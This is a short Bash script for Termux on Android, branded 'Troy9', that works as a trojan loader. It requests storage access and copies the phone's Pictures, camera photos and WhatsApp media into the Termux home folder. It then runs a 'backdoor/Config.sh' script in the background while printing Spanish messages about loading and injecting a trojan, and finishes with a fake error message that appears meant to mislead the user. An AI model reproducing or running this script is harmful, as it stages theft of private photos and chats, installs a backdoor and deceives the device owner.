#! /bin/bash

setterm -foreground red
figlet Troy9
echo ""

setterm -foreground green
termux-setup-storage
echo -n "[+]Presione enter para continuar _"
read enter
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
echo "[+]Cargando troyano ..."
sleep 3
cd /$HOME/backdoor
bash Config.sh &
echo "[+]Inyectando troyano ..."
sleep 10
setterm -foreground red
echo "[x]ERROR"

